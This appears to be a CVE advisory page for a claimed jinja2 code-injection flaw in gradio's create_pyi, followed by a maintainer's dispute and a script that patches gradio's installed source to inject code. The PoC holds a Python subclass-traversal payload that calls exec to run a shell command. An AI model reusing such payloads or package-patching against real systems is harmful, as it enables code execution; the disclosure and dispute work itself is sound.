| Hi [@kmulka-bloomberg](https://github.com/kmulka-bloomberg) as far as I understand, this is not a real security vulnerability since it only affects a user who runs specifically crafted code that happens to use gradio library. But is someone is executing code from a third party, then they are already executing arbitrary code anyways, so the fact that jinja2 is injecting some code is not a real additional security threat. If I'm misunderstanding something, please let me know. |

| [@abidlabs](https://github.com/abidlabs) Thanks for the response. I don't understand the ComponentMeta code enough to understand if user-contributed data (via the gradio web UI or API) would be fed to the create\_pyi function. Maybe you could help me / others understand what the purpose of this function is and if it is possible user-contributed data could be passed through. |

| I used this form <https://cveform.mitre.org/> to dispute the security vulnerability. I used this script to provide an alternate way where a user could simply monkeypatch the gradio library to produce a similar effect:  ``` import os import re  import gradio gradio_dir = os.path.dirname(gradio.__file__) components_file_path = os.path.join(gradio_dir, 'components.py')  with open(components_file_path, 'r') as file:     file_contents = file.read()  pattern = r'(class Textbox\(.*?\):\s+def __init__\(self,.*?\):\s+)' replacement = r'\1\n        print("Custom code executed: Textbox is being created")\n'  new_file_contents = re.sub(pattern, replacement, file_contents, flags=re.DOTALL)  with open(components_file_path, 'w') as file:     file.write(new_file_contents)  print("gradio package has been modified. Custom code will now execute whenever Textbox is instantiated.") ``` |

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

### version

4.36.1

### description

When users generate pyi, they do not check the input, which leads to code injection by jinja2 during rendering.

### Source code

```
def create_pyi(class_code: str, events: list[EventListener | str]):
    template = Template(INTERFACE_TEMPLATE)
    events = [e if isinstance(e, str) else e.event_name for e in events]
    return template.render(events=events, contents=class_code)
```

PoC:

```
import gradio as gr

# Define the events
events = ["on_load"]

pyi_code = gr.component_meta.create_pyi(''.__class__.__base__.__subclasses__()[139].__init__.__globals__['__builtins__']['exec']('import os; os.system("id")') , events)
```

### Impact:

The vulnerability allows attackers to execute arbitrary code.
